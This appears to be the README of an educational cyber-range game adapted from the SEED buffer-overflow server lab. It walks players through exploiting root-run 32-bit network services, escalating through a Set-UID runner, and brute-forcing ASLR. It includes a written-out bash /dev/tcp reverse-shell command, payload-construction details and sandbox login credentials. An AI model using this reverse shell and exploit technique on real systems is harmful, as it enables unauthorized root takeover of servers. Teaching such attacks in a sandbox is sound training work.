# Buffer Overflow Attack Lab (Server Version)

Hands-on buffer-overflow attack lab. The player takes the role of a penetration tester who must
exploit two vulnerable network services running as **root** on a target server, inject shellcode,
and obtain a **root reverse shell** on each in order to read the secret flag.

This lab is based on the [SEED Labs](https://seedsecuritylabs.org/) *Buffer Overflow Attack Lab
(Server Version)* by Wenliang Du (Syracuse University).

## Disclaimer

This game is for **educational purposes only**. The techniques shown must only be used inside this
training sandbox. Unauthorized use against systems you do not own or have permission to test is illegal.

## License

The game design of this project is licensed under CC BY 4.0:
https://creativecommons.org/licenses/by/4.0

## Scenario

You are a penetration tester. On the target network there is a server (`10.1.26.9`) exposing two
network services, each wrapping a program written in C. Both programs contain a classic **stack
buffer-overflow** vulnerability and run as **root**. Your mission: exploit them to obtain a **root
shell** and read the secret flag on each service.

You work from the **attacker** machine (`10.1.26.23`), a SEED Ubuntu box equipped with the tools you
need (`gcc`, `python3`, `netcat`, `gdb`) and the lab files in `~/shellcode` and `~/attack-code`.

| Machine  | IP            | Role                        |
|----------|---------------|-----------------------------|
| attacker | `10.1.26.23`  | your box (you log in here)  |
| server   | `10.1.26.9`   | runs the vulnerable services |

| Target  | Address          | Difficulty                                    |
|---------|------------------|-----------------------------------------------|
| Level 1 | `10.1.26.9:9090` | 32-bit, shows frame pointer **and** buffer address |
| Level 2 | `10.1.26.9:9091` | 32-bit, shows **only** the buffer address     |

**Prerequisites:** basic Linux command line · basic C and stack layout · basic networking (TCP, netcat).

**Learning outcomes:**
- Understand how a stack buffer overflow overwrites the return address.
- Build a payload (NOP sled + shellcode + return address) and exploit a remote service.
- Obtain a root reverse shell on a vulnerable server.
- Explain how ASLR mitigates buffer-overflow attacks.

---

## Access: Get into the environment

**Learning outcome:** the player learns how to reach their workstation in the cloud sandbox.

The attacker machine lives in the CyberRangeCZ sandbox, so the player must open a session on it.
In the topology overview, right-click **`attacker`** → **Open GUI** and log in with username `user`
and password `Password123`. SSH into the same box is an equivalent alternative. There is **no** login
to the server — the server is reached only through its vulnerable network services.

The flag for this step is `start`.

**Estimated duration:** 0 minutes


## Task 1: Shellcode & Set-UID — read the protected flag

**Learning outcome:** the player understands that shellcode runs with the privilege of the program that
executes it, and uses a Set-UID-root program to read a file their own account cannot.

The flag is stored in `/opt/flag`, owned by root with mode `0400`, so the `user` account is denied
(`cat /opt/flag` → Permission denied). The player is given a **Set-UID-root** runner,
`~/shellcode/run-shellcode`: because a Set-UID program runs with the privilege of its owner (root), and
this runner executes whatever shellcode is in `codefile_32`, any command the player's shellcode runs
executes as root. Working only with the 32-bit generator `shellcode_32.py` (whose shellcode already
begins with a `setuid(0)` call so the launched bash keeps root), the player edits the command string to
`cat /opt/flag` — keeping the trailing `*` marker in the same column — regenerates with
`./shellcode_32.py`, and runs `./run-shellcode` to print the flag as root.

Typing `cat /opt/flag` directly, or running the shellcode through any runner the student compiles
themselves (which would be owned by `user`, not Set-UID root), both execute as `user` and are denied —
so the step genuinely cannot be bypassed.

The flag is the contents of `/opt/flag` (a per-sandbox `FLAG-T1-…` value), readable only via the
Set-UID runner.

**Estimated duration:** ~10 minutes


## Task 2: Level 1 attack (32-bit)

**Learning outcome:** the player performs the core exploit — overwriting the return address to run
injected shellcode and escalating to an interactive root shell.

The first target runs on `10.1.26.9:9090` (32-bit). A benign probe
(`echo hello | nc 10.1.26.9 9090`) makes the server reply with the **frame pointer (ebp)** and the
**buffer's address** inside `bof()`. From these the player computes where to place the return address
and shellcode: the return-address slot sits at `ebp+4`, so `offset = (ebp - buffer) + 4`. They set
`ret` to an address inside a NOP sled (e.g. `buffer + 0x120`), place the shellcode near the end of the
517-byte payload, and build `badfile` with `~/attack-code/exploit.py`.

To get an interactive shell, the shellcode's command string is changed to a **reverse shell** back to
the attacker (`/bin/bash -i > /dev/tcp/10.1.26.23/4444 0<&1 2>&1`); the player runs `nc -lnv 4444` as a
listener, fires the payload with `cat badfile | nc 10.1.26.9 9090`, and lands as **root** on the target.

The flag is the contents of `/root/flag` on the Level 1 target.

**Estimated duration:** ~20 minutes


## Task 3: Level 2 attack (32-bit, buffer size unknown)

**Learning outcome:** the player writes a single robust, size-independent exploit payload.

The second target runs on `10.1.26.9:9091` (still 32-bit), but reveals **only the buffer's address** —
not the frame pointer — so the buffer size is unknown (somewhere in `[100, 300]` bytes; the saved
frame pointer is always a multiple of 4). Rather than brute-forcing one size at a time, the player
**sprays the return address** every 4 bytes across the whole window where the return slot could be
(all copies point into the same NOP sled) and places the shellcode at the very end of the 517-byte
payload. One payload then works for any size in range. A root reverse shell is obtained exactly as in
Task 2.

The flag is the contents of `/root/flag` on the Level 2 target.

**Estimated duration:** ~20 minutes


## Task 4: Defeating Address Randomization

**Learning outcome:** the player understands ASLR and why it can still be defeated by brute force on
a 32-bit target.

Task 4 has its **own container** at `10.1.26.9:9092` (Level 3). It runs the **same 32-bit binary as
Level 1**, but with **ASLR enabled** — unlike Levels 1 and 2, whose services opt out of randomization
(launched under `setarch -R`) so their addresses stay fixed. Probing `:9092` repeatedly shows the
leaked buffer address **changing on every connection**, so the fixed return address from Task 2 usually
misses and the service reports `==== Returned Properly ====` or crashes.

The player then exploits the fact that a 32-bit stack has only **19 bits of entropy** —
`2^19 = 524,288` possible stack base addresses — a space small enough to exhaust. Keeping the **same
badfile from Task 2**, they fire it in a loop against `:9092` with `~/attack-code/brute-force.sh`
(listener `nc -lnv 4444` ready as before); within minutes one attempt lines the stack up with the
hard-coded return address, the shellcode runs, and the root reverse shell connects. On 64-bit the
entropy is far larger, making this brute force impractical.

The flag is the contents of `/root/flag` on the Level 3 (`:9092`) container — a unique per-sandbox
value that can only be read after the brute force yields a root shell.

**Estimated duration:** ~20 minutes
